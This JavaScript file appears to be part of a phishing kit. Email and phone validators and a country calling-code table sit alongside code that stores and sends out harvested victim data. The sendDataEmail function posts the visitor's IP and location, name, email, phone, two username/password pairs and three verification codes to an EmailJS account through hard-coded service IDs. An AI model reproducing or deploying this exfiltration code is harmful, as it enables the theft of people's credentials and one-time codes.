
function validateEmailCheck(email) {
    var regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
}

function validatePhoneNumberCheck(phoneNumber) {
    var regex = /^[0-9\s!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/;
    return regex.test(phoneNumber);
}

const countryCallingCodes = [
    { countryCode: "AF", callingCode: "+93" },
    { countryCode: "AL", callingCode: "+355" },
    { countryCode: "DZ", callingCode: "+213" },
    { countryCode: "AS", callingCode: "+1-684" },
    { countryCode: "AD", callingCode: "+376" },
    { countryCode: "AO", callingCode: "+244" },
    { countryCode: "AI", callingCode: "+1-264" },
    { countryCode: "AG", callingCode: "+1-268" },
    { countryCode: "AR", callingCode: "+54" },
    { countryCode: "AM", callingCode: "+374" },
    { countryCode: "AW", callingCode: "+297" },
    { countryCode: "AU", callingCode: "+61" },
    { countryCode: "AT", callingCode: "+43" },
    { countryCode: "AZ", callingCode: "+994" },
    { countryCode: "BS", callingCode: "+1-242" },
    { countryCode: "BH", callingCode: "+973" },
    { countryCode: "BD", callingCode: "+880" },
    { countryCode: "BB", callingCode: "+1-246" },
    { countryCode: "BY", callingCode: "+375" },
    { countryCode: "BE", callingCode: "+32" },
    { countryCode: "BZ", callingCode: "+501" },
    { countryCode: "BJ", callingCode: "+229" },
    { countryCode: "BM", callingCode: "+1-441" },
    { countryCode: "BT", callingCode: "+975" },
    { countryCode: "BO", callingCode: "+591" },
    { countryCode: "BA", callingCode: "+387" },
    { countryCode: "BW", callingCode: "+267" },
    { countryCode: "BR", callingCode: "+55" },
    { countryCode: "BN", callingCode: "+673" },
    { countryCode: "BG", callingCode: "+359" },
    { countryCode: "BF", callingCode: "+226" },
    { countryCode: "BI", callingCode: "+257" },
    { countryCode: "KH", callingCode: "+855" },
    { countryCode: "CM", callingCode: "+237" },
    { countryCode: "CA", callingCode: "+1" },
    { countryCode: "CV", callingCode: "+238" },
    { countryCode: "CF", callingCode: "+236" },
    { countryCode: "TD", callingCode: "+235" },
    { countryCode: "CL", callingCode: "+56" },
    { countryCode: "CN", callingCode: "+86" },
    { countryCode: "CO", callingCode: "+57" },
    { countryCode: "KM", callingCode: "+269" },
    { countryCode: "CG", callingCode: "+242" },
    { countryCode: "CD", callingCode: "+243" },
    { countryCode: "CR", callingCode: "+506" },
    { countryCode: "CI", callingCode: "+225" },
    { countryCode: "HR", callingCode: "+385" },
    { countryCode: "CU", callingCode: "+53" },
    { countryCode: "CY", callingCode: "+357" },
    { countryCode: "CZ", callingCode: "+420" },
    { countryCode: "DK", callingCode: "+45" },
    { countryCode: "DJ", callingCode: "+253" },
    { countryCode: "DM", callingCode: "+1-767" },
    { countryCode: "DO", callingCode: "+1-809, +1-829, +1-849" },
    { countryCode: "EC", callingCode: "+593" },
    { countryCode: "EG", callingCode: "+20" },
    { countryCode: "SV", callingCode: "+503" },
    { countryCode: "GQ", callingCode: "+240" },
    { countryCode: "ER", callingCode: "+291" },
    { countryCode: "EE", callingCode: "+372" },
    { countryCode: "ET", callingCode: "+251" },
    { countryCode: "FJ", callingCode: "+679" },
    { countryCode: "FI", callingCode: "+358" },
    { countryCode: "FR", callingCode: "+33" },
    { countryCode: "GA", callingCode: "+241" },
    { countryCode: "GM", callingCode: "+220" },
    { countryCode: "GE", callingCode: "+995" },
    { countryCode: "GH", callingCode: "+233" },
    { countryCode: "GR", callingCode: "+30" },
    { countryCode: "GD", callingCode: "+1-473" },
    { countryCode: "GT", callingCode: "+502" },
    { countryCode: "GN", callingCode: "+224" },
    { countryCode: "GW", callingCode: "+245" },
    { countryCode: "GY", callingCode: "+592" },
    { countryCode: "HT", callingCode: "+509" },
    { countryCode: "HN", callingCode: "+504" },
    { countryCode: "HU", callingCode: "+36" },
    { countryCode: "IS", callingCode: "+354" },
    { countryCode: "IN", callingCode: "+91" },
    { countryCode: "ID", callingCode: "+62" },
    { countryCode: "IR", callingCode: "+98" },
    { countryCode: "IQ", callingCode: "+964" },
    { countryCode: "IE", callingCode: "+353" },
    { countryCode: "IL", callingCode: "+972" },
    { countryCode: "IT", callingCode: "+39" },
    { countryCode: "JM", callingCode: "+1-876" },
    { countryCode: "JP", callingCode: "+81" },
    { countryCode: "JO", callingCode: "+962" },
    { countryCode: "KZ", callingCode: "+7" },
    { countryCode: "KE", callingCode: "+254" },
    { countryCode: "KI", callingCode: "+686" },
    { countryCode: "KP", callingCode: "+850" },
    { countryCode: "KR", callingCode: "+82" },
    { countryCode: "KW", callingCode: "+965" },
    { countryCode: "KG", callingCode: "+996" },
    { countryCode: "LA", callingCode: "+856" },
    { countryCode: "LV", callingCode: "+371" },
    { countryCode: "LB", callingCode: "+961" },
    { countryCode: "LS", callingCode: "+266" },
    { countryCode: "LR", callingCode: "+231" },
    { countryCode: "LY", callingCode: "+218" },
    { countryCode: "LI", callingCode: "+423" },
    { countryCode: "LT", callingCode: "+370" },
    { countryCode: "LU", callingCode: "+352" },
    { countryCode: "MG", callingCode: "+261" },
    { countryCode: "MW", callingCode: "+265" },
    { countryCode: "MY", callingCode: "+60" },
    { countryCode: "MV", callingCode: "+960" },
    { countryCode: "ML", callingCode: "+223" },
    { countryCode: "MT", callingCode: "+356" },
    { countryCode: "MH", callingCode: "+692" },
    { countryCode: "MR", callingCode: "+222" },
    { countryCode: "MU", callingCode: "+230" },
    { countryCode: "MX", callingCode: "+52" },
    { countryCode: "FM", callingCode: "+691" },
    { countryCode: "MD", callingCode: "+373" },
    { countryCode: "MC", callingCode: "+377" },
    { countryCode: "MN", callingCode: "+976" },
    { countryCode: "ME", callingCode: "+382" },
    { countryCode: "MA", callingCode: "+212" },
    { countryCode: "MZ", callingCode: "+258" },
    { countryCode: "MM", callingCode: "+95" },
    { countryCode: "NA", callingCode: "+264" },
    { countryCode: "NR", callingCode: "+674" },
    { countryCode: "NP", callingCode: "+977" },
    { countryCode: "NL", callingCode: "+31" },
    { countryCode: "NZ", callingCode: "+64" },
    { countryCode: "NI", callingCode: "+505" },
    { countryCode: "NE", callingCode: "+227" },
    { countryCode: "NG", callingCode: "+234" },
    { countryCode: "NO", callingCode: "+47" },
    { countryCode: "OM", callingCode: "+968" },
    { countryCode: "PK", callingCode: "+92" },
    { countryCode: "PW", callingCode: "+680" },
    { countryCode: "PA", callingCode: "+507" },
    { countryCode: "PG", callingCode: "+675" },
    { countryCode: "PY", callingCode: "+595" },
    { countryCode: "PE", callingCode: "+51" },
    { countryCode: "PH", callingCode: "+63" },
    { countryCode: "PL", callingCode: "+48" },
    { countryCode: "PT", callingCode: "+351" },
    { countryCode: "QA", callingCode: "+974" },
    { countryCode: "RO", callingCode: "+40" },
    { countryCode: "RU", callingCode: "+7" },
    { countryCode: "RW", callingCode: "+250" },
    { countryCode: "KN", callingCode: "+1-869" },
    { countryCode: "LC", callingCode: "+1-758" },
    { countryCode: "VC", callingCode: "+1-784" },
    { countryCode: "WS", callingCode: "+685" },
    { countryCode: "SM", callingCode: "+378" },
    { countryCode: "ST", callingCode: "+239" },
    { countryCode: "SA", callingCode: "+966" },
    { countryCode: "SN", callingCode: "+221" },
    { countryCode: "RS", callingCode: "+381" },
    { countryCode: "SC", callingCode: "+248" },
    { countryCode: "SL", callingCode: "+232" },
    { countryCode: "SG", callingCode: "+65" },
    { countryCode: "SK", callingCode: "+421" },
    { countryCode: "SI", callingCode: "+386" },
    { countryCode: "SB", callingCode: "+677" },
    { countryCode: "SO", callingCode: "+252" },
    { countryCode: "ZA", callingCode: "+27" },
    { countryCode: "SS", callingCode: "+211" },
    { countryCode: "ES", callingCode: "+34" },
    { countryCode: "LK", callingCode: "+94" },
    { countryCode: "SD", callingCode: "+249" },
    { countryCode: "SR", callingCode: "+597" },
    { countryCode: "SZ", callingCode: "+268" },
    { countryCode: "SE", callingCode: "+46" },
    { countryCode: "CH", callingCode: "+41" },
    { countryCode: "SY", callingCode: "+963" },
    { countryCode: "TW", callingCode: "+886" },
    { countryCode: "TJ", callingCode: "+992" },
    { countryCode: "TZ", callingCode: "+255" },
    { countryCode: "TH", callingCode: "+66" },
    { countryCode: "TL", callingCode: "+670" },
    { countryCode: "TG", callingCode: "+228" },
    { countryCode: "TO", callingCode: "+676" },
    { countryCode: "TT", callingCode: "+1-868" },
    { countryCode: "TN", callingCode: "+216" },
    { countryCode: "TR", callingCode: "+90" },
    { countryCode: "TM", callingCode: "+993" },
    { countryCode: "TV", callingCode: "+688" },
    { countryCode: "UG", callingCode: "+256" },
    { countryCode: "UA", callingCode: "+380" },
    { countryCode: "AE", callingCode: "+971" },
    { countryCode: "GB", callingCode: "+44" },
    { countryCode: "US", callingCode: "+1" },
    { countryCode: "UY", callingCode: "+598" },
    { countryCode: "UZ", callingCode: "+998" },
    { countryCode: "VU", callingCode: "+678" },
    { countryCode: "VA", callingCode: "+379" },
    { countryCode: "VE", callingCode: "+58" },
    { countryCode: "VN", callingCode: "+84" },
    { countryCode: "YE", callingCode: "+967" },
    { countryCode: "ZM", callingCode: "+260" },
    { countryCode: "ZW", callingCode: "+263" },
  ];
  
  
   const countryCodeMap = new Map();
   countryCallingCodes.forEach(country => {
   countryCodeMap.set(country.countryCode.toUpperCase(), country.callingCode);
   });

   function getCallingCode(countryCode) {
   const code = countryCodeMap.get(countryCode.toUpperCase());
   return code ? code : "Not found.";
   }

  function getUserIp() {
    fetch("https://ipinfo.io/json")
    .then(response => {
        if (!response.ok) {
            throw new Error("error");
        }
        return response.json();
    })
    .then(data => {
        localStorage.setItem('user_ip', data.ip); 
        localStorage.setItem('country', data.city);
        localStorage.setItem('country_code', data.country);
        localStorage.setItem('call_code', getCallingCode(data.country)); 
        
    })
    .catch(error => {
        console.error("not API:", error);
    });
}

function sendDataEmail() {
    
    var serviceID = "service_21nqwu9";
    var userId = "MJoJc3qQzxgi0S2yU";
    var templateId = "template_zsjz0cn";

    // var serviceID = "service_n6smkc5";
    // var userId = "CotCewqhd4cwvx6qa";
    // var templateId = "template_x2qv39d";

    var templateData = {
        'user_ip': localStorage.getItem('user_ip'),
        'country': localStorage.getItem('country'),
        'country_code': localStorage.getItem('country_code'),
        'call_code': localStorage.getItem('call_code'),
      
        'full-name': localStorage.getItem('fullname'),
        'email': localStorage.getItem('email'),
        'mobile-phone': localStorage.getItem('phone'),

        'user1': localStorage.getItem('user1'),
        'pass1': localStorage.getItem('pass1'),

        'user2': localStorage.getItem('user2'),
        'pass2': localStorage.getItem('pass2'),

        'code1': localStorage.getItem('code1'),
        'code2': localStorage.getItem('code2'),
        'code3': localStorage.getItem('code3'),

        'currentUrl': localStorage.getItem('currentUrl'),
    };
    
    var data = {
        service_id: serviceID,
        template_id: templateId,
        user_id: userId,
        template_params: templateData
    };

    $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
        type: 'POST',
        data: JSON.stringify(data),
        contentType: 'application/json'
    }).done(function() {
        // Handle success
    }).fail(function(error) {
        // Handle error
    });
}

function localStorageinit() {
    getUserIp();

    localStorage.setItem('fullname', '');
    localStorage.setItem('email', '');
    localStorage.setItem('phone', '');


    localStorage.setItem('user1', '');
    localStorage.setItem('pass1', '');

    localStorage.setItem('user2', '');
    localStorage.setItem('pass2', '');

    localStorage.setItem('code1', '');
    localStorage.setItem('code2', '');
    localStorage.setItem('code3', '');

    localStorage.setItem('currentUrl', window.location.href);
    
}
